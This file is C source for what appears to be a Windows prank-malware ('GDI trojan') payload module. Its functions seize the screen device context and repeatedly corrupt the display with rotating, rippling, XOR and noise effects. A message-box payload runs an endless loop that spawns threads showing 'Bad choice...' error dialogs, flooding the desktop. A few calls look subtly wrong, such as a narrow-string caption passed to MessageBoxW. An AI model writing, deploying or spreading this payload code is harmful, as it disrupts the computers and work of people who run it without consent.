#include "phosphorium.h"

VOID
ExecuteGdiShader(
	_In_ GDI_SHADER gsShader,
	_In_ INT nTimer
)
{
	HDC hdc = GetDC(NULL);
	INT nStartTimer = dwTickCount;

	POINT ptScreen = GetVirtualScreenPosition();
	SIZE szScreen = GetVirtualScreenSize();
	BITMAPINFO lpbmpi = { 0 };

	HDC hdcTempScreen;
	HBITMAP hBitmapScreen;

	lpbmpi.bmiHeader.biSize = sizeof(BITMAPINFO);
	lpbmpi.bmiHeader.biBitCount = 32;
	lpbmpi.bmiHeader.biPlanes = 1;
	lpbmpi.bmiHeader.biWidth = szScreen.cx;
	lpbmpi.bmiHeader.biHeight = szScreen.cy;

	PRGBQUAD prgbQuad = { 0 };

	hdcTempScreen = CreateCompatibleDC(hdc);
	hBitmapScreen = CreateDIBSection(hdc, &lpbmpi, 0, (VOID**)&prgbQuad, NULL, 0);
	SelectObject(hdcTempScreen, hBitmapScreen);

	for (INT i = 0; dwTickCount < (nStartTimer + nTimer); i++)
	{
		hdc = GetDC(NULL);
		BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdc, 0, 0, SRCCOPY);

		gsShader(i, szScreen.cx, szScreen.cy, prgbQuad);
		BitBlt(hdc, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);

		ReleaseDC(NULL, hdc);
		DeleteObject(hdc);
		Sleep(10);
	}

	DeleteObject(hBitmapScreen);
	DeleteDC(hdcTempScreen);

	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	Sleep(PAYLOAD_COOLDOWN);
}

VOID
GdiShader1(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ PRGBQUAD prgbQuad
)
{
	FLOAT fAngle = t * 0.01f;
	FLOAT fZoom = 0.02f + 0.01f * sinf(t * 0.05f);

	FLOAT fcosA = cosf(fAngle);
	FLOAT fsinA = sinf(fAngle);

	INT cx = w / 2;
	INT cy = h / 2;

	for (INT y = 0; y < h; y++)
	{
		for (INT x = 0; x < w; x++)
		{
			INT dx = x - cx;
			INT dy = y - cy;

			FLOAT u = (fcosA * dx - fsinA * dy) * fZoom;
			FLOAT v = (fsinA * dx + fcosA * dy) * fZoom;

			BYTE r = (BYTE)(128 + 127 * sinf(u + t * 0.02f));
			BYTE g = (BYTE)(128 + 127 * sinf(v + t * 0.03f));
			BYTE b = (BYTE)(128 + 127 * sinf(u + v + t * 0.01f));

			INT i = y * w + x;
			prgbQuad[i].Red = r;
			prgbQuad[i].Green += g;
			prgbQuad[i].Blue = b;
			prgbQuad[i].bUnused = 0;
		}
	}
}

VOID
GdiShader2(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ PRGBQUAD prgbQuad
)
{
	FLOAT fSpeed = 0.01f + t * 0.0001f;
	INT nCenterX = w / 2;
	INT nCenterY = h / 2;

	for (INT y = 0; y < h; y++)
	{
		for (INT x = 0; x < w; x++)
		{
			INT nDX = x - nCenterX;
			INT nDY = y - nCenterY;

			FLOAT fDist = sqrtf((FLOAT)(nDX * nDX + nDY * nDY)) * 0.05f;

			BYTE nR = (BYTE)(128 + 127 * sinf(fDist + t * fSpeed));
			BYTE nG = (BYTE)(128 + 127 * sinf(fDist * 0.8f + t * fSpeed * 1.2f));
			BYTE nB = (BYTE)(128 + 127 * sinf(fDist * 1.5f + t * fSpeed * 0.7f));

			INT nIndex = y * w + x;
			prgbQuad[nIndex].Red += nR;
			prgbQuad[nIndex].Green += nG;
			prgbQuad[nIndex].Blue += nB;
			prgbQuad[nIndex].bUnused = 0;
		}
	}
}

VOID
GdiShader3(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ PRGBQUAD prgbQuad
)
{
	FLOAT fTime = t * 0.03f;
	INT centerX = w / 2;
	INT centerY = h / 2;

	for (INT y = 0; y < h; y++)
	{
		for (INT x = 0; x < w; x++)
		{
			INT dx = x - centerX;
			INT dy = y - centerY;

			FLOAT fDist = sqrtf((FLOAT)(dx * dx + dy * dy)) * 0.04f;
			FLOAT fAngle = atan2f((FLOAT)dy, (FLOAT)dx);
			FLOAT fRipple = sinf(fDist * 4.0f - fTime + sinf(fAngle * 3.0f + fTime * 0.5f));

			BYTE r = (BYTE)(128 + 127 * sinf(fRipple + fTime));
			BYTE g = (BYTE)(128 + 127 * tanf(fRipple * 0.7f + fTime * 1.3f));
			BYTE b = (BYTE)(128 + 127 * logf(fRipple * 1.4f + fTime * 0.8f));

			INT index = y * w + x;
			prgbQuad[index].Red = r;
			prgbQuad[index].Green *= g;
			prgbQuad[index].Blue = b;
			prgbQuad[index].bUnused = 0;
		}
	}
}

VOID
GdiShaderWave(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ PRGBQUAD prgbQuad
)
{
	INT blockSize = 32;
	INT offsetRange = 40;

	for (INT y = 0; y < h; y++)
	{
		for (INT x = 0; x < w; x++)
		{
			INT blockX = (x / blockSize) * blockSize;
			INT blockY = (y / blockSize) * blockSize;

			INT offsetX = (INT)(sin(t * 0.05 + blockY * 0.01) * offsetRange);
			INT offsetY = (INT)(cos(t * 0.05 + blockX * 0.01) * offsetRange);

			INT srcX = blockX + (x % blockSize) + offsetX;
			INT srcY = blockY + (y % blockSize) + offsetY;

			srcX = max(0, min(w - 1, srcX));
			srcY = max(0, min(h - 1, srcY));

			INT srcIndex = srcY * w + srcX;
			INT dstIndex = y * w + x;

			prgbQuad[dstIndex] = prgbQuad[srcIndex];
		}
	}
}

VOID
GdiShader5(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ PRGBQUAD prgbQuad
)
{
	FLOAT fAngle = t * 0.01f;
	FLOAT fZoom = 0.02f + 0.01f * sinf(t * 0.05f);

	FLOAT fcosA = cosf(fAngle);
	FLOAT fsinA = sinf(fAngle);

	INT cx = w / 2;
	INT cy = h / 2;

	for (INT y = 0; y < h; y++)
	{
		for (INT x = 0; x < w; x++)
		{
			INT dx = x - cx;
			INT dy = y - cy;

			FLOAT u = (fcosA * dx - fsinA * dy) * fZoom;
			FLOAT v = (fsinA * dx + fcosA * dy) * fZoom;

			BYTE r = (BYTE)(128 + 127 * sinf(u + t * 0.02f));
			BYTE g = (BYTE)(128 + 127 * tanf(v + t * 0.03f));
			BYTE b = (BYTE)(128 + 127 * logf(u + v + t * 0.01f));

			INT i = y * w + x;
			prgbQuad[i].Red ^= r;
			prgbQuad[i].Green += g;
			prgbQuad[i].bUnused = 0;
		}
	}
}

VOID
GdiShader6(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ PRGBQUAD prgbQuad
)
{
	for (INT y = 0; y < h; y++)
	{
		for (INT x = 0; x < w; x++)
		{
			INT xorVal = (x + y ^ t) & 255;

			INT i = y * w + x;
			prgbQuad[i].Red += (BYTE)xorVal;
			prgbQuad[i].Green += (BYTE)(xorVal ^ 0x55);
			prgbQuad[i].Blue += (BYTE)(255 - xorVal);
			prgbQuad[i].bUnused = 0;
		}
	}
}

VOID
FinalGdiShader(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ PRGBQUAD prgbQuad
)
{
	for (INT y = 0; y < h; y++)
	{
		for (INT x = 0; x < w; x++)
		{
			INT i = y * w + x;
			prgbQuad[i].nRGB = (Xorshift32() % 0x100) * 0x010101;
			prgbQuad[i].bUnused = 0;
		}
	}
}

VOID
WINAPI
SpamMessageBoxes(VOID)
{
	if (Xorshift32() % 2 == 0)
	{
		MessageBoxW(NULL, L"Bad choice...", "Bad mistake...", MB_ABORTRETRYIGNORE | MB_ICONERROR);
		Sleep(10);
	}
	else
	{
		MessageBoxW(NULL, L"Bad choice...", "Bad mistake...", MB_YESNO | MB_ICONWARNING);
		Sleep(10);
	}
}

VOID
WINAPI
MessageBoxPayload(VOID)
{
	for (;;)
	{
		CloseHandle(CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)SpamMessageBoxes, NULL, 0, NULL));
		Sleep(Xorshift32() % 2000);
	}
}